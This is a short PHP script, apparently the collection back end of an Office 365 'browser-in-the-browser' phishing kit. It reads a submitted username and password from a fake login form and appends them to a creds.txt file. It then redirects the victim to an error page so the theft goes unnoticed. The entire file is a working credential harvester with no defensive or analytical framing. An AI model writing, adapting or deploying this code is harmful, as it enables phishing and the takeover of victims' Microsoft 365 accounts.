<?php

$username = $_POST['username'];
$password = $_POST['passwd'];

$myfile = fopen("/opt/O365-BITB/creds.txt", "a") or die("Unable to open file, ensure filepath is correct (Line 6) and chmod 666 it.");

fwrite($myfile, $username);
fwrite($myfile, ":");
fwrite($myfile, $password);
fwrite($myfile, "\n");
fclose($myfile);

header("Location: error.html");

die();

?>
